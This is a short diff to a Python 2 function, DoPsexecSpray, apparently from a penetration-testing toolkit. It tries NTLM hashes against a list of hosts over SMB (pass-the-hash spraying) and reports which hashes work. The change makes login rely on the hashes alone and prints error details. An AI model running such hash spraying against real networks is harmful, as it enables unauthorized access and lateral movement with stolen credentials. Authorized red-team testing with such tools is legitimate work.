@@ -76,12 +76,13 @@ def DoPsexecSpray(exeFile, hashfile="", ipfile="", username="", domain=""):
                 print E
                 continue
             try:
-                smb.login(user=targetusername, password=targetpassword,
+                smb.login(user=targetusername, password=None,
                           domain=targetdomain, lmhash=targetlm, nthash=targetnt)
                 print t.bold_green + "[!] This Hash Worked - " + smb.getServerName() + t.normal
                 workinghashes.append(hash + ", " + ip)
-            except:
+            except Exception as E:
                 print t.bold_red + "[!] This Hash Failed" + t.normal
+                print E
 
     if workinghashes:
         print t.green + "\n[*] Working Hashes:"
